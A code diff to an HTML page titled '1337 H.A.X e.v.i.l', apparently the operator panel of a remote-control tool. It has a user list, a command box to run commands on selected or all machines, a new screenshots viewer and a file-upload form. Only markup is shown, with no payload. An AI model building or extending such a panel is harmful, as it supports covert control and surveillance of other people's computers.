@@ -8,8 +8,19 @@
 	</head>
 	<body>
 		<h1>1337 H.A.X e.v.i.l</h1>
-		<button id="refresh" onclick="refresh_users()">Refresh Users</button>
-		<table id="users"></table>
+		
+		<div id="container_top">
+			<button id="refresh" onclick="refresh_users()">Refresh Users</button>
+			<br />
+			<div id="users_container">
+				<table id="users"></table>
+			</div>
+			<div id="screenshots"></div>
+		</div>
+		<button id="show_screenshots" onclick="show_screenshots()">Show Screenshots</button>
+		<br />
+		<br />
+		
 		<textarea id="cmd"></textarea>
 		<button id="run_selected" disabled="disabled" onclick="run_selected()" onkeypress="">Run for...</button>
 		<button id="run_all" onclick="run_all()" onkeypress="">Run for ALL</button>
@@ -38,5 +49,11 @@
 		<br />
 		
 		<textarea id="log" readonly="readonly"></textarea>
+		
+<form action="../put_data.php" method="post" enctype="multipart/form-data">
+File:
+<input type="file" name="s">
+<input type="submit" value="Upload File (THIS IS A TEST)" name="submit">
+</form>
 	</body>
 </html>
